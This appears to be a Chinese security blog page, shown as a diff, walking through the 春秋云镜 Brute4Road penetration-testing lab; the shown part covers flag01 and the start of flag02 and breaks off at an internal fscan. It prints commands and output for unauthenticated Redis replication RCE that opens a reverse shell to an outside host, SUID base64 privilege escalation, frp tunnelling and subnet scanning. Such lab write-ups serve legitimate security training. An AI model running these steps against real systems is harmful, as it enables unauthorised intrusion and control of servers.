@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>春秋云镜-Brute4Road - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='Brute4Road'>
+  <meta itemprop="name" content="春秋云镜-Brute4Road">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-04-21T15:48:44+08:00">
+  <meta itemprop="dateModified" content="2025-04-21T15:48:44+08:00">
+  <meta itemprop="wordCount" content="2719">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="Brute4Road"><meta property="og:url" content="http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="春秋云镜-Brute4Road">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-21T15:48:44+08:00">
+    <meta property="article:modified_time" content="2025-04-21T15:48:44+08:00">
+    <meta property="article:tag" content="Brute4Road">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="春秋云镜-Brute4Road">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road/" title="春秋云镜-Brute4Road - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient/" title="春秋云镜-Tsclient" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road/index.md" title="春秋云镜-Brute4Road - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "春秋云镜-Brute4Road",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road\/"
+    },"genre": "posts","keywords": "Brute4Road","wordcount":  2719 ,
+    "url": "http:\/\/localhost:1313\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road\/","datePublished": "2025-04-21T15:48:44+08:00","dateModified": "2025-04-21T15:48:44+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">春秋云镜-Brute4Road</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>春秋云镜-Brute4Road</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category" title="Category - 内网渗透"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 内网渗透</a></span></div><div class="post-meta-line"><span title="published on 2025-04-21 15:48:44"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-21">2025-04-21</time></span>&nbsp;<span title="2719 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#flag01">flag01</a></li>
+    <li><a href="#flag02">flag02</a></li>
+    <li><a href="#flag03">flag03</a></li>
+    <li><a href="#flag04">flag04</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="flag01" class="heading-element"><span>flag01</span>
+  <a href="#flag01" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -Pn -sT -vv -min-rate <span class="m">10000</span> 39.98.127.36 -p6379  
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-04-20 13:35 CST  
+</span></span><span class="line"><span class="cl">Initiating Parallel DNS resolution of <span class="m">1</span> host. at 13:35  
+</span></span><span class="line"><span class="cl">Completed Parallel DNS resolution of <span class="m">1</span> host. at 13:35, 0.07s elapsed  
+</span></span><span class="line"><span class="cl">Initiating Connect Scan at 13:35  
+</span></span><span class="line"><span class="cl">Scanning 39.98.127.36 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>  
+</span></span><span class="line"><span class="cl">Discovered open port 6379/tcp on 39.98.127.36  
+</span></span><span class="line"><span class="cl">Completed Connect Scan at 13:35, 0.05s elapsed <span class="o">(</span><span class="m">1</span> total ports<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 39.98.127.36  
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.049s latency<span class="o">)</span>.  
+</span></span><span class="line"><span class="cl">Scanned at 2025-04-20 13:35:01 CST <span class="k">for</span> 0s  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON  
+</span></span><span class="line"><span class="cl">6379/tcp open  redis   syn-ack  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Read data files from: /opt/homebrew/bin/../share/nmap  
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.15 seconds  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>存在<code>redis</code>未授权服务，直接打<code>主从复制rce</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@mail:~/redis-rogue-server-master# python3 redis-rogue-server.py --rhost 39.98.127.36 --rport <span class="m">6379</span> --  
+</span></span><span class="line"><span class="cl">lhost 8.137.71.171 --lport <span class="m">1234</span>  
+</span></span><span class="line"><span class="cl">______         _ _      ______                         _____                            
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ___ <span class="se">\ </span>      <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>     <span class="p">|</span> ___ <span class="se">\ </span>                      /  ___<span class="p">|</span>                           
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="p">|</span>_/ /___  __<span class="p">|</span> <span class="p">|</span>_ ___  <span class="p">|</span> <span class="p">|</span>_/ /___   __ _ _   _  ___  <span class="se">\ </span><span class="sb">`</span>--.  ___ _ ____   _____ _ __   
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    // _ <span class="se">\/</span> _<span class="sb">`</span> <span class="p">|</span> / __<span class="p">|</span> <span class="p">|</span>    // _ <span class="se">\ </span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/ _ <span class="se">\ </span> <span class="sb">`</span>--. <span class="se">\/</span> _ <span class="se">\ </span><span class="s1">&#39;__\ \ / / _ \ &#39;</span>__<span class="p">|</span>  
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="p">|</span><span class="se">\ \ </span> __/ <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\ </span><span class="p">|</span> <span class="p">|</span><span class="se">\ \ </span><span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>  __/ /<span class="se">\_</span>_/ /  __/ <span class="p">|</span>   <span class="se">\ </span>V /  __/ <span class="p">|</span>     
+</span></span><span class="line"><span class="cl"><span class="se">\_</span><span class="p">|</span> <span class="se">\_\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span>___/ <span class="se">\_</span><span class="p">|</span> <span class="se">\_\_</span>__/ <span class="se">\_</span>_, <span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span> <span class="se">\_</span>___/ <span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>    <span class="se">\_</span>/ <span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>     
+</span></span><span class="line"><span class="cl">                                     __/ <span class="p">|</span>                                              
+</span></span><span class="line"><span class="cl">                                    <span class="p">|</span>___/                                               
+</span></span><span class="line"><span class="cl">@copyright n0b0dy @ r3kapig  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> TARGET 39.98.127.36:6379  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> SERVER 8.137.71.171:1234  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Setting master...  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Setting dbfilename...  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Loading module...  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Temerory cleaning up...  
+</span></span><span class="line"><span class="cl">What <span class="k">do</span> u want, <span class="o">[</span>i<span class="o">]</span>nteractive shell or <span class="o">[</span>r<span class="o">]</span>everse shell: r  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Open reverse shell...  
+</span></span><span class="line"><span class="cl">Reverse server address: 8.137.71.171  
+</span></span><span class="line"><span class="cl">Reverse server port: <span class="m">1235</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Reverse shell payload sent.  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Check at 8.137.71.171:1235  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>info<span class="o">]</span> Unload module...  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201336987.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201336987.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201336987.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201336987.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201336987.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201336987.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+利用<code>suid</code>提权<br>
+<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>redis@centos-web01 tmp<span class="o">]</span>$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null  
+</span></span><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null  
+</span></span><span class="line"><span class="cl">/usr/sbin/pam_timestamp_check  
+</span></span><span class="line"><span class="cl">/usr/sbin/usernetctl  
+</span></span><span class="line"><span class="cl">/usr/sbin/unix_chkpwd  
+</span></span><span class="line"><span class="cl">/usr/bin/at  
+</span></span><span class="line"><span class="cl">/usr/bin/chfn  
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd  
+</span></span><span class="line"><span class="cl">/usr/bin/passwd  
+</span></span><span class="line"><span class="cl">/usr/bin/chage  
+</span></span><span class="line"><span class="cl">/usr/bin/base64  
+</span></span><span class="line"><span class="cl">/usr/bin/umount  
+</span></span><span class="line"><span class="cl">/usr/bin/su  
+</span></span><span class="line"><span class="cl">/usr/bin/chsh  
+</span></span><span class="line"><span class="cl">/usr/bin/sudo  
+</span></span><span class="line"><span class="cl">/usr/bin/crontab  
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp  
+</span></span><span class="line"><span class="cl">/usr/bin/mount  
+</span></span><span class="line"><span class="cl">/usr/bin/pkexec  
+</span></span><span class="line"><span class="cl">/usr/libexec/dbus-1/dbus-daemon-launch-helper  
+</span></span><span class="line"><span class="cl">/usr/lib/polkit-1/polkit-agent-helper-1  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>base64</code>提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>redis@centos-web01 tmp<span class="o">]</span>$ base64 <span class="s2">&#34;/home/redis/flag/flag01&#34;</span> <span class="p">|</span> base64 --decode  
+</span></span><span class="line"><span class="cl">base64 <span class="s2">&#34;/home/redis/flag/flag01&#34;</span> <span class="p">|</span> base64 --decode  
+</span></span><span class="line"><span class="cl"> ██████                    ██              ██  ███████                           ██  
+</span></span><span class="line"><span class="cl">░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██  
+</span></span><span class="line"><span class="cl">░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██  
+</span></span><span class="line"><span class="cl">░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████  
+</span></span><span class="line"><span class="cl">░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██  
+</span></span><span class="line"><span class="cl">░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██  
+</span></span><span class="line"><span class="cl">░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████  
+</span></span><span class="line"><span class="cl">░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░   
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">flag01: flag<span class="o">{</span>fa2cf8ca-3b47-4ba7-8110-b807f44adc95<span class="o">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Congratulations! ! !  
+</span></span><span class="line"><span class="cl">Guess where is the second flag?  </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="flag02" class="heading-element"><span>flag02</span>
+  <a href="#flag02" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>wget</code>下载<code>frp</code>进行代理<br>
+<code>nohup ./frpc -c frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code><br>
+获得内网IP地址，进行<code>fscan</code>扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/hosts  
+</span></span><span class="line"><span class="cl">::1     localhost       localhost.localdomain   localhost6      localhost6.localdomain6  
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost       localhost.localdomain   localhost4      localhost4.localdomain4  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">172.22.2.7      centos-web01    centos-web01  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>fscan -h 172.22.2.7/24</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>redis@centos-web01 tmp<span class="o">]</span>$ ./fscan -h 172.22.2.7/24  
